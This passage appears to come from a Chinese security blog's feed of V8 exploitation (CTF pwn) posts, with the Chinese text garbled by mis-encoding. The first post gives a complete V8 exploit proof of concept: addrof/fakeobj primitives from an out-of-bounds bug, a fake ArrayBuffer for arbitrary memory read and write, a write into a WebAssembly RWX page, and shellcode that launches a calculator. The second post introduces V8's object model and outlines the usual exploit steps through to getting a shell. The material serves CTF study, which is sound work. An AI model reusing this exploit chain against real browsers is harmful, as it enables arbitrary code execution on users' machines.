store*(ç°åœ¨å·²ç»è¢«æ›¿æ¢æˆä»»æ„åœ°å€)ä¸­çš„å€¼ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åç§»ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¤§å°ç«¯ï¼Œtrueè¡¨ç¤ºå°ç«¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_32</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_64</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);<span class="comment">//å†™å…¥ä»»æ„åœ°å€</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="å®Œæ•´POC"><a href="#å®Œæ•´POC" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h3><p>å®é™…ä¸Šå‰é¢çš„å·¥ä½œå°±æ˜¯åˆ›å»ºä¸€ä¸ªJSArray(<code>fake_array_buffer_obj</code>)ï¼Œç„¶åä¸ºäº†åˆ©ç”¨ArrayBufferçš„Backing Storeå’ŒDataViewæ¥å®ç°ä»»æ„åœ°å€è¯»å†™ï¼Œ<code>fake_array_buffer_obj</code>æ•°ç»„å…ƒç´ æ˜¯æ„é€ å¥½ä¸€ä¸ªArrayBufferçš„å†…å­˜å¸ƒå±€ï¼Œåé¢æ„é€ fake mapç­‰ä¸€ç³»åˆ—æ“ä½œå…¶å®å°±æ˜¯æŠŠ<code>fake_array_buffer_obj</code>çš„Elementsæ”¹é€ æˆä¸€ä¸ª<code>ArrayBuffer</code>ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæœ€åå¾—åˆ°<code>fake_array_buffer</code>æ—¶ä¼ å…¥<code>fakeobj</code>çš„å…¶å®æ˜¯<code>fake_array_buffer_obj</code>çš„Elementsçš„addressï¼Œä¹‹ååœ¨å¯»æ‰¾wasm instanceé™„è¿‘çš„æƒé™ä¸ºrwxçš„å†…å­˜çš„åç§»ï¼Œæœ€ååªè¦åˆ©ç”¨è¿™äº›å·¥å…·ç±»å†™å…¥shellcodeå°±è¡Œäº†ï¼Œè¿™é‡Œç®€å•ä½¿ç”¨ä¸€ä¸ªå¼¹è®¡ç®—å™¨çš„shellcode</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">const</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"><span class="comment">// Floating point to 64-bit unsigned integer</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="title class_">Array</span>.<span class="title function_">from</span>(u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64-bit unsigned integer to Floating point</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        u32.<span class="title function_">set</span>(tmp);</span><br><span class="line">        <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 32-bit unsigned integer to hex **string**</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj_param</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr[<span class="number">0</span>] = obj_param;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(double_arr.<span class="title function_">oob</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(obj_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    double_arr[<span class="number">0</span>] = addr;</span><br><span class="line">    double_arr.<span class="title function_">oob</span>(obj_arr.<span class="title function_">oob</span>());<span class="comment">//æ›¿æ¢map*</span></span><br><span class="line">    <span class="keyword">return</span> double_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">gc</span>();<span class="title function_">gc</span>();</span><br><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties ï¼ˆpropertiesåªè¦ä¸å»è®¿é—®ï¼Œè®¾ç½®æˆ0ä¹Ÿæ²¡äº‹ï¼‰</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map</span></span><br><span class="line">];</span><br><span class="line"><span class="title function_">gc</span>();<span class="title function_">gc</span>();</span><br><span class="line"><span class="keyword">let</span> fake_obj_elements_addr = <span class="title function_">addrof</span>(fake_array_buffer_obj) + <span class="number">0x48</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake obj elements addr is:&quot;</span>+<span class="title function_">hex</span>(fake_obj_elements_addr));</span><br><span class="line"><span class="keyword">let</span> array_buffer_obj_map_addr = fake_obj_elements_addr + <span class="number">64</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake array buffer&#x27;s map addr is:&quot;</span>+<span class="title function_">hex</span>( array_buffer_obj_map_addr));</span><br><span class="line">fake_array_buffer_obj[<span class="number">0</span>]=<span class="title function_">u2d</span>(array_buffer_obj_map_addr);<span class="comment">//fake mapçš„åœ°å€æ›¿æ¢</span></span><br><span class="line"><span class="keyword">let</span> fake_array_buffer = <span class="title function_">fakeobj</span>(<span class="title function_">u2d</span>(fake_obj_elements_addr));<span class="comment">//fake objä¼šåˆ©ç”¨ç±»å‹æ··æ·†ï¼ŒæŠŠä¼ å…¥çš„åœ°å€å½“ä½œHeapObject Pointerè§£æ</span></span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,<span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>,<span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);<span class="comment">//ä¸€ä¸ªç®€å•çš„mainå‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_i_addr = <span class="title function_">addrof</span>(wasm_instance);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_32</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);<span class="comment">//æŠŠbacking store*æ”¹æˆè¦è¯»å–çš„åœ°å€</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>));<span class="comment">//getFloat64å‡½æ•°å¯ä»¥è·å¾—backing store*(ç°åœ¨å·²ç»è¢«æ›¿æ¢æˆä»»æ„åœ°å€)ä¸­çš„å€¼ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åç§»ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¤§å°ç«¯ï¼Œtrueè¡¨ç¤ºå°ç«¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_32</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_64</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);<span class="comment">//å†™å…¥ä»»æ„åœ°å€</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">get_64</span>((wasm_i_addr + <span class="number">0x88</span> - <span class="number">1</span>)); <span class="comment">//-1æ˜¯å› ä¸ºTagged Value</span></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;[+] rwx_addr : &#x27;</span> + <span class="title function_">hex</span>(rwx_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sc = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">21</span>);</span><br><span class="line">sc[<span class="number">0</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">sc[<span class="number">1</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">sc[<span class="number">2</span>] = <span class="number">0x782fb848</span>;</span><br><span class="line">sc[<span class="number">3</span>] = <span class="number">0x636c6163</span>;</span><br><span class="line">sc[<span class="number">4</span>] = <span class="number">0x48500000</span>;</span><br><span class="line">sc[<span class="number">5</span>] = <span class="number">0x73752fb8</span>;</span><br><span class="line">sc[<span class="number">6</span>] = <span class="number">0x69622f72</span>;</span><br><span class="line">sc[<span class="number">7</span>] = <span class="number">0x8948506e</span>;</span><br><span class="line">sc[<span class="number">8</span>] = <span class="number">0xc03148e7</span>;</span><br><span class="line">sc[<span class="number">9</span>] = <span class="number">0x89485750</span>;</span><br><span class="line">sc[<span class="number">10</span>] = <span class="number">0xd23148e6</span>;</span><br><span class="line">sc[<span class="number">11</span>] = <span class="number">0x3ac0c748</span>;</span><br><span class="line">sc[<span class="number">12</span>] = <span class="number">0x50000030</span>;</span><br><span class="line">sc[<span class="number">13</span>] = <span class="number">0x4944b848</span>;</span><br><span class="line">sc[<span class="number">14</span>] = <span class="number">0x414c5053</span>;</span><br><span class="line">sc[<span class="number">15</span>] = <span class="number">0x48503d59</span>;</span><br><span class="line">sc[<span class="number">16</span>] = <span class="number">0x3148e289</span>;</span><br><span class="line">sc[<span class="number">17</span>] = <span class="number">0x485250c0</span>;</span><br><span class="line">sc[<span class="number">18</span>] = <span class="number">0xc748e289</span>;</span><br><span class="line">sc[<span class="number">19</span>] = <span class="number">0x00003bc0</span>;</span><br><span class="line">sc[<span class="number">20</span>] = <span class="number">0x050f00</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.<span class="property">length</span>; i++) &#123;</span><br><span class="line"><span class="title function_">set_32</span>(rwx_addr + i * <span class="number">4</span>, sc[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f</span>();<span class="comment">//æœ€åè°ƒç”¨ä¸€ä¸‹wasmå®ä¾‹åŒ–çš„mainå‡½æ•°ï¼Œæ¥è§¦å‘shellcode</span></span><br></pre></td></tr></table></figure></div><p>å¯ä»¥çœ‹åˆ°å¼¹è®¡ç®—å™¨æˆåŠŸäº†</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115181021063.png"                      alt="image-20241115181021063"                ><figcaption>image-20241115181021063</figcaption></figure></p><blockquote><p>mç³»åˆ—macä¸Šç”¨UTMè¿è¡Œçš„x86è™šæ‹ŸæœºUIç•Œé¢å®åœ¨å¤ªå¡äº†ï¼Œsshè¿æ¥æ›´æ–¹ä¾¿ç‚¹</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js-engine </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V8-pwnå…¥é—¨(1)â€”â€”å¯¹è±¡æ¨¡å‹ã€ç‰¹æ€§</title>
      <link href="/2024/11/12/V8-pwn%E5%85%A5%E9%97%A8-1-%E2%80%94%E2%80%94%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E3%80%81%E7%89%B9%E6%80%A7/"/>
      <url>/2024/11/12/V8-pwn%E5%85%A5%E9%97%A8-1-%E2%80%94%E2%80%94%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E3%80%81%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€ğŸ’¬"><a href="#0x00-å‰è¨€ğŸ’¬" class="headerlink" title="0x00 å‰è¨€ğŸ’¬"></a>0x00 å‰è¨€ğŸ’¬</h2><p>ä¸‹é¢è¯´çš„éƒ½æ˜¯chrome80ä»¥å‰çš„v8ï¼Œæ— sandboxã€æŒ‡é’ˆå‹ç¼©</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115181353869.png"                      alt="image-20241115181353869"                ><figcaption>image-20241115181353869</figcaption></figure></p><h2 id="0x01-åŸºç¡€ğŸª¨"><a href="#0x01-åŸºç¡€ğŸª¨" class="headerlink" title="0x01 åŸºç¡€ğŸª¨"></a>0x01 åŸºç¡€ğŸª¨</h2><h3 id="JS-Engine-CTFçš„å¸¸è§æ¨¡å¼"><a href="#JS-Engine-CTFçš„å¸¸è§æ¨¡å¼" class="headerlink" title="JS Engine CTFçš„å¸¸è§æ¨¡å¼"></a>JS Engine CTFçš„å¸¸è§æ¨¡å¼</h3><ol><li><p>ç”±å‡ºé¢˜â¼ˆâ¾ƒâ¼°ç¼–å†™çš„patchå¼•â¼Šçš„æ¼æ´</p></li><li><p>å†å²æ¼æ´çš„CVEè¢«å‡ºé¢˜â¼ˆé‡æ–°å¼•â¼Š</p></li></ol><h4 id="æ”»ç•¥æ–¹æ³•"><a href="#æ”»ç•¥æ–¹æ³•" class="headerlink" title="æ”»ç•¥æ–¹æ³•"></a>æ”»ç•¥æ–¹æ³•</h4><ol><li><p>åˆ›å»ºâ¼€ä¸ªâ½¤äºè°ƒè¯•çš„jsç¯å¢ƒï¼Œå¦‚æœæœ‰å‡ºé¢˜â¼ˆæä¾›çš„å¼•â¼Šæ¼æ´çš„patchï¼Œé‚£ä¹ˆæ‰“ä¸Šè¿™ä¸ªpatch</p></li><li><p>åˆ†æè¿™ä¸ªpatchå¹¶åˆ¤æ–­è¿™ä¸ªpatchå¼•â¼Šçš„æ˜¯jså¼•æ“çš„å“ªä¸ªé˜¶æ®µ</p></li></ol><p>â€‹a. Runtime(CSA or Torque), TurboFan, Ignition, AST, InlineCache, â€¦</p><ol start="3"><li><p>æ„é€ pocå»è§¦å‘æ¼æ´</p></li><li><p>åˆ©â½¤æ¼æ´å»æ„é€ ä»»æ„åœ°å€è¯»å†™&#x2F;ä»»æ„å¯¹è±¡åœ°å€çš„æ³„éœ²&#x2F;ä¼ªé€ ä»»æ„å¯¹è±¡ç­‰åŸè¯­</p></li><li><p>getshellï¼Œå¸¸â½¤çš„â½…æ³•æ˜¯åˆ©â½¤v8â¾¥çš„rwxåœ°å€åŒºåŸŸï¼ˆwasmä¸­å°±æœ‰ï¼‰ç›´æ¥å†™â¼Šshellcodeä»£ç æ¥å®ç°ä»»æ„ä»£ç æ‰§â¾</p></li></ol><h2 id="0x02-V8å¯¹è±¡æ¨¡å‹âš™ï¸"><a href="#0x02-V8å¯¹è±¡æ¨¡å‹âš™ï¸" class="headerlink" title="0x02 V8å¯¹è±¡æ¨¡å‹âš™ï¸"></a>0x02 V8å¯¹è±¡æ¨¡å‹âš™ï¸</h2><h3 id="objects-h"><a href="#objects-h" class="headerlink" title="objects.h"></a>objects.h</h3><p>v8æºç ä¸­çš„objects.hé‡Œå†™äº†å¯¹è±¡æ¨¡å‹çš„ç»“æ„ï¼Œå¯ä»¥çœ‹å‡ºæœ€å¤§çš„æ˜¯Objectï¼ŒObjectæ€»ä½“ä¸Šåˆ†ä¸ºä¸¤ç±»<code>Smi</code>å’Œ<code>HeapObject</code></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Most object types in the V8 JavaScript are described in this file.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Inheritance hierarchy:</span></span><br><span class="line"><span class="comment">// - Object</span></span><br><span class="line"><span class="comment">//   - Smi          (immediate small integer)</span></span><br><span class="line"><span class="comment">//   - HeapObject   (superclass for everything allocated in the heap)</span></span><br><span class="line"><span class="comment">//     - JSReceiver  (suitable for property access)</span></span><br><span class="line"><span class="comment">//       - JSObject</span></span><br><span class="line"><span class="comment">//         - JSArray</span></span><br><span class="line"><span class="comment">//         - JSArrayBuffer</span></span><br><span class="line"><span class="comment">//        .........</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Formats of Object::ptr_:</span></span><br><span class="line"><span class="comment">//  Smi:        [31 bit signed int] 0</span></span><br><span class="line"><span class="comment">//  HeapObject: [32 bit direct pointer] (4 byte aligned) | 01</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å‡¡æ˜¯åˆ†é…åœ¨v8å †ä¸Šçš„ï¼Œéƒ½ä¼šç»§æ‰¿è‡ª<code>HeapObject</code>,<code>Smi</code>ç±»ä¼¼äºcpuä¸­çš„ç«‹å³æ•°</p></blockquote><p>v8ä¸­çš„å„ç§ç±»ä¸æ˜¯c++è¯­æ³•å®ç°çš„ï¼Œå› æ­¤æ²¡æœ‰æ„é€ å’Œææ„å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•çš„å­—æ®µ&#x2F;æˆå‘˜å±æ€§ï¼Œæ˜¯ç›´æ¥åœ¨<strong>v8 heap</strong>ä¸Šé€šè¿‡<code>AllocateRaw</code>å‡½æ•°åˆ†é…å‡ºæ¥çš„å†…å­˜</p><blockquote><p>å†æ ¹æ®ä¸åŒobjectçš„ç»“æ„ï¼Œå¯¹ä¸åŒåç§»çš„å†…å­˜å†™å…¥å€¼ï¼ŒğŸ§è¿™æ ·çš„ç›®çš„æ˜¯ä¸ºäº†é€šè¿‡v8 heapæ¥ç®¡ç†å†…å­˜ã€å®ç°ç²¾å‡†GC</p><p><a class="link"   href="https://fa1lr4in.com/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/" >ã€Šåƒåœ¾å›æ”¶çš„ç®—æ³•ä¸å®ç°ã€‹v8ç¯‡ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="V8-Objectåˆ†ç±»"><a href="#V8-Objectåˆ†ç±»" class="headerlink" title="V8-Objectåˆ†ç±»"></a>V8-Objectåˆ†ç±»</h3><p>åˆ†ä¸ºSmiå’ŒHeapObject</p><ul><li>smiè¡¨ç¤ºæœ‰ç¬¦å·çš„31&#x2F;32ä½å°æ•´æ•°</li><li>æŒ‡å‘HeapObjectçš„æŒ‡é’ˆï¼Œç”±äºå†…å­˜å¯¹é½ï¼ˆ8&#x2F;4å­—èŠ‚ï¼‰æ‰€ä»¥æŒ‡é’ˆçš„æœ€ä½ä½ä¸º0</li></ul><blockquote><p>è¿™é‡Œä¸ºäº†æ›´æ–¹ä¾¿ä½¿ç”¨smiï¼Œæ„æ€æ˜¯ä¸å¦å¤–ç”¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸€å—å†…å­˜ç©ºé—´ï¼Œé‡Œé¢å†å­˜smiï¼Œè€Œä¸”ç›´æ¥ç”¨32&#x2F;64bitè¡¨ç¤ºï¼Œå…·ä½“æ¥è¯´ï¼ŒHeapObjectæŒ‡é’ˆæœ€ä½ä½è‚¯å®šä¸º0ï¼Œä½†æ˜¯ç”±äºsmiçš„ä½¿ç”¨æ›´é¢‘ç¹ç‚¹ï¼Œæ‰€ä»¥é€‰æ‹©è®©smiå·¦ç§»ä¸€ä½è®©æœ€ä½ä½å˜æˆ0ï¼Œè€ŒHeapObjectæŒ‡é’ˆåˆ™æ˜¯æŠŠæœ€ä½ä½ç½®1ï¼Œä½¿ç”¨æ—¶å†æ¢å¤ã€‚è¿™ç§åŒºåˆ†Smiå’ŒæŒ‡å‘HeapObjectçš„æŒ‡é’ˆçš„æ–¹æ³•å«<code>Tagged Values</code></p></blockquote><h4 id="Smiï¼ˆå°æ•´æ•°ï¼‰"><a href="#Smiï¼ˆå°æ•´æ•°ï¼‰" class="headerlink" 